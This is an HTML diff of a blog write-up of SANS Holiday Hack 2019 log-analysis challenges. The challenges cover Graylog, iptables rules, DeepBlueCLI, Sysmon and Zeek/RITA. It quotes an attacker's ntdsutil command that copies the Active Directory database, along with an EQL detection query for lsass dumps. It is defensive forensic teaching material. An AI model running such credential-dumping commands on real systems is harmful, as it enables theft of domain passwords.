-</code></pre><p>We know exfiltration was done with PowerShell from wks2 so our filter is:</p><ul>
-<li><code>SourceHostname:elfu\-res\-wks2.localdomain AND ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code></li></ul><p>Which gives us one event.</p><pre tabindex=0><code>DestinationHostname
+</code></pre><p>We know exfiltration was done with PowerShell from wks2 so our filter is:</p><ul><li><code>SourceHostname:elfu\-res\-wks2.localdomain AND ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code></li></ul><p>Which gives us one event.</p><pre tabindex=0><code>DestinationHostname
     pastebin.com
 DestinationIp
     104.22.3.84
@@ -995,41 +897,21 @@ SourceIp
 SourcePort
 53564
 </code></pre><h1 id=kent-tinseltooth---smart-braces>Kent Tinseltooth - Smart Braces
-<a class=header-link href=#kent-tinseltooth---smart-braces><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p><code>srf.elfu.org</code></p><p>A proper configuration for the Smart Braces should be exactly:</p><ol>
-<li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li><li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the
+<a class=header-link href=#kent-tinseltooth---smart-braces><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><code>srf.elfu.org</code></p><p>A proper configuration for the Smart Braces should be exactly:</p><ol><li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li><li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the
 INPUT and the OUTPUT chains.</li><li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access
 the local SSH server (on port 22).</li><li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21
 and 80.</li><li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.</li><li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo
-interface.</li></ol><p>Tutorial: <a href=https://wiki.centos.org/HowTos/Network/IPTables target=_blank rel="noreferrer noopener">https://wiki.centos.org/HowTos/Network/IPTables</a></p><ol>
-<li>Default policites to DROP
-<ul>
-<li>sudo iptables -P INPUT DROP</li><li>sudo iptables -P OUTPUT DROP</li><li>sudo iptables -P FORWARD DROP</li></ul></li><li>Accept all connections that are established, related.
-<ul>
-<li>sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li><li>sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li></ul></li><li>Accept only one IP for SSH.
-<ul>
-<li>sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT</li></ul></li><li>Have to match multiport to specify multiple ports in one rule
-<ul>
-<li>sudo iptables -A INPUT -p tcp --match multiport --dports 21,80 -j ACCEPT</li></ul></li><li>Accept all output traffic going to port 80.
-<ul>
-<li>sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</li></ul></li><li>Accept all traffic fromthe lo interface.
-<ul>
-<li>sudo iptables -A INPUT -i lo -j ACCEPT</li></ul></li></ol><h1 id=find-the-turtle-doves>Find the Turtle Doves
-<a class=header-link href=#find-the-turtle-doves><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>They are in the student union area.</p><h1 id=3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome
-<a class=header-link href=#3-windows-log-analysis-evaluate-attack-outcome><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>We're seeing attacks against the Elf U domain! Using the event log data,
+interface.</li></ol><p>Tutorial: <a href=https://wiki.centos.org/HowTos/Network/IPTables target=_blank rel="noreferrer noopener">https://wiki.centos.org/HowTos/Network/IPTables</a></p><ol><li>Default policites to DROP<ul><li>sudo iptables -P INPUT DROP</li><li>sudo iptables -P OUTPUT DROP</li><li>sudo iptables -P FORWARD DROP</li></ul></li><li>Accept all connections that are established, related.<ul><li>sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li><li>sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li></ul></li><li>Accept only one IP for SSH.<ul><li>sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT</li></ul></li><li>Have to match multiport to specify multiple ports in one rule<ul><li>sudo iptables -A INPUT -p tcp --match multiport --dports 21,80 -j ACCEPT</li></ul></li><li>Accept all output traffic going to port 80.<ul><li>sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</li></ul></li><li>Accept all traffic fromthe lo interface.<ul><li>sudo iptables -A INPUT -i lo -j ACCEPT</li></ul></li></ol><h1 id=find-the-turtle-doves>Find the Turtle Doves
+<a class=header-link href=#find-the-turtle-doves><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>They are in the student union area.</p><h1 id=3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome
+<a class=header-link href=#3-windows-log-analysis-evaluate-attack-outcome><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>We're seeing attacks against the Elf U domain! Using the event log data,
 identify the user account that the attacker compromised using a password spray
 attack. Bushy Evergreen is hanging out in the train station and may be able to
-help you out.</p><ul>
-<li><a href=https://downloads.elfu.org/Security.evtx.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/Security.evtx.zip</a></li></ul><p>Bushy Evergreen says <code>DeepBlueCLI tool is useful</code>.</p><p><code>.\DeepBlue.ps1 .\Security.evtx >> report.txt</code> and it spits out the report.</p><p>The tool gives <code>Multiple admin logons for one account</code> for three accounts but
+help you out.</p><ul><li><a href=https://downloads.elfu.org/Security.evtx.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/Security.evtx.zip</a></li></ul><p>Bushy Evergreen says <code>DeepBlueCLI tool is useful</code>.</p><p><code>.\DeepBlue.ps1 .\Security.evtx >> report.txt</code> and it spits out the report.</p><p>The tool gives <code>Multiple admin logons for one account</code> for three accounts but
 only one of them appears in the <code>Password Spray Attack</code> prompts.</p><p>Answer: <code>supatree</code></p><h1 id=4-windows-log-analysis-determine-attacker-technique>4. Windows Log Analysis: Determine Attacker Technique
-<a class=header-link href=#4-windows-log-analysis-determine-attacker-technique><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Using these normalized Sysmon logs, identify the tool the attacker used to
+<a class=header-link href=#4-windows-log-analysis-determine-attacker-technique><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Using these normalized Sysmon logs, identify the tool the attacker used to
 retrieve domain password hashes from the lsass.exe process. For hints on
 achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.</p><p><a href=https://downloads.elfu.org/sysmon-data.json.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/sysmon-data.json.zip</a></p><p>Mimikatz has a module named <code>lsadump</code>. Mimikatz does not appear in the logs but
-the module might.</p><p><a href=https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump target=_blank rel="noreferrer noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p><p>Maybe it's <code>procdump</code>. No it's not.</p><p>Search with <code>EQL</code> at <a href=https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql</a></p><p>This query did not work.</p><ul>
-<li><a href=https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html</a></li><li><code>file where file_name == "lsass*.dmp" and process_name != "werfault.exe"</code></li></ul><p>Looking here, <a href=https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ target=_blank rel="noreferrer noopener">https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/</a></p><p>We can see some tools. Going through the tools, we get to <code>ntdsutil</code>. Searching
+the module might.</p><p><a href=https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump target=_blank rel="noreferrer noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p><p>Maybe it's <code>procdump</code>. No it's not.</p><p>Search with <code>EQL</code> at <a href=https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql</a></p><p>This query did not work.</p><ul><li><a href=https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html</a></li><li><code>file where file_name == "lsass*.dmp" and process_name != "werfault.exe"</code></li></ul><p>Looking here, <a href=https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ target=_blank rel="noreferrer noopener">https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/</a></p><p>We can see some tools. Going through the tools, we get to <code>ntdsutil</code>. Searching
 for it, we get to the last entry in the file which has our answer.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;command_line&#34;</span>: <span style=color:#2aa198>&#34;ntdsutil.exe  \&#34;ac i ntds\&#34; ifm \&#34;create full c:\\hive\&#34; q q&#34;</span>,
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;event_type&#34;</span>: <span style=color:#2aa198>&#34;process&#34;</span>,
@@ -1049,67 +931,22 @@ for it, we get to the last entry in the file which has our answer.</p><div class
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;user_name&#34;</span>: <span style=color:#2aa198>&#34;SYSTEM&#34;</span>
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><p>Answer: <code>ntdsutil</code></p><h1 id=5-network-log-analysis-determine-compromised-system>5. Network Log Analysis: Determine Compromised System
-<a class=header-link href=#5-network-log-analysis-determine-compromised-system><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>The attacks don't stop! Can you help identify the IP address of the
+<a class=header-link href=#5-network-log-analysis-determine-compromised-system><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The attacks don't stop! Can you help identify the IP address of the
 malware-infected system using these Zeek logs? For hints on achieving this
-objective, please visit the Laboratory and talk with Sparkle Redberry.</p><ul>
-<li><a href=https://downloads.elfu.org/elfu-zeeklogs.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/elfu-zeeklogs.zip</a></li></ul><p>Hint from Sparkle:</p><pre tabindex=0><code>You got it - three cheers for cheer!
+objective, please visit the Laboratory and talk with Sparkle Redberry.</p><ul><li><a href=https://downloads.elfu.org/elfu-zeeklogs.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/elfu-zeeklogs.zip</a></li></ul><p>Hint from Sparkle:</p><pre tabindex=0><code>You got it - three cheers for cheer!
 For objective 5, have you taken a look at our Zeek logs?
 Something&#39;s gone wrong. But I hear someone named Rita can help us.
 Can you and she figure out what happened?
-</code></pre><p>Rita is a framework for network traffic analysis and can ingest Zeek logs.</p><ul>
-<li><a href=https://github.com/activecm/rita target=_blank rel="noreferrer noopener">https://github.com/activecm/rita</a></li></ul><p>Seems like we might not have needed to install rita because the logs have the
-html report.</p><p>Following the video here, HTML report is discussed at:</p><ul>
-<li><a href="https://youtu.be/JoWzkcEotA8?t=350" target=_blank rel="noreferrer noopener">https://youtu.be/JoWzkcEotA8?t=350</a></li></ul><p>Open the <code>ELFU/index.html</code> file and click on <code>Beacons</code>. Then we will see one
+</code></pre><p>Rita is a framework for network traffic analysis and can ingest Zeek logs.</p><ul><li><a href=https://github.com/activecm/rita target=_blank rel="noreferrer noopener">https://github.com/activecm/rita</a></li></ul><p>Seems like we might not have needed to install rita because the logs have the
+html report.</p><p>Following the video here, HTML report is discussed at:</p><ul><li><a href="https://youtu.be/JoWzkcEotA8?t=350" target=_blank rel="noreferrer noopener">https://youtu.be/JoWzkcEotA8?t=350</a></li></ul><p>Open the <code>ELFU/index.html</code> file and click on <code>Beacons</code>. Then we will see one
 node (<code>192.168.134.130</code>) with almost a perfect score (<code>0.998</code>). Has a lot of
 connections (<code>7660</code>) and goes to a weird IP address (<code>144.202.46.214</code>).</p><pre tabindex=0><code>Score	Source	Destination	Connections	Avg. Bytes	Intvl. Range	Size Range	Intvl. Mode	Size Mode	Intvl. Mode Count	Size Mode Count	Intvl. Skew	Size Skew	Intvl. Dispersion	Size Dispersion
 0.998	192.168.134.130	144.202.46.214	7660	1156.000	10	683	10	563	6926	7641	0.000	0.000	0	0
-</code></pre><p>There's nothing in Blacklists (<code>BL Source IPs</code> <code>BL Dest. IPs</code> and <code>BL Hostnames</code>).</p><p>This was our answer <code>192.168.134.130</code>.</p></div><footer>
-<p class=meta>
-<span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
-<time>Jan 15, 2020</time>
-</span>
-</p><p class=meta>
-<a class="basic-alignment left" href=https://parsiya.net/blog/2019-12-22-using-mozilla-rhino-to-run-javascript-in-java/ title="Using Mozilla Rhino to Run JavaScript in Java">Using Mozilla Rhino to Run JavaScript in Java</a>
-<a class="basic-alignment right" href=https://parsiya.net/blog/2020-02-06-documentation-writing-for-system-administrators-notes/ title="Documentation Writing for System Administrators - Notes">Documentation Writing for System Administrators - Notes</a>
-</p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script>
-<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
-</footer></article></div><aside class="sidebar thirds">
-<section class="first odd">
-<h1>Who am I?</h1><p>
-<p>I am Parsia, a senior security engineer at <a href=https://www.ea.com/security target=_blank rel="noreferrer noopener">Electronic Arts</a>.</p><p>I write about application security, reverse engineering,
-Go, cryptography, and (obviously) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav>
-<li class=sidebar-nav-item>
-<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+</code></pre><p>There's nothing in Blacklists (<code>BL Source IPs</code> <code>BL Dest. IPs</code> and <code>BL Hostnames</code>).</p><p>This was our answer <code>192.168.134.130</code>.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
+<time>Jan 15, 2020</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2019-12-22-using-mozilla-rhino-to-run-javascript-in-java/ title="Using Mozilla Rhino to Run JavaScript in Java">Using Mozilla Rhino to Run JavaScript in Java</a>
+<a class="basic-alignment right" href=https://parsiya.net/blog/2020-02-06-documentation-writing-for-system-administrators-notes/ title="Documentation Writing for System Administrators - Notes">Documentation Writing for System Administrators - Notes</a></p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, a senior security engineer at <a href=https://www.ea.com/security target=_blank rel="noreferrer noopener">Electronic Arts</a>.</p><p>I write about application security, reverse engineering,
+Go, cryptography, and (obviously) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://keybase.io/parsiya/ title=https://keybase.io/parsiya/><i class="fa fa-keybase fa-3x"></i></a>
-<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a>
-</li></ul><section class=odd>
-<h1>Collections</h1><li>
-<a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a>
-</li><li>
-<a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a>
-</li><li>
-<a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a>
-</li><li>
-<a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a>
-</li><li>
-<a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a>
-</li><li>
-<a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a>
-</li><li>
-<a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a>
-</li><li>
-<a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a>
-</li><li>
-<a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a>
-</li><li>
-<a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a>
-</li><li>
-<a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a>
-</li><li>
-<a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a>
-</li></section></aside></div></div><footer role=contentinfo>
-<p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
-<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.
-</p></footer></body></html>
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a></li><li><a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a></li><li><a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>
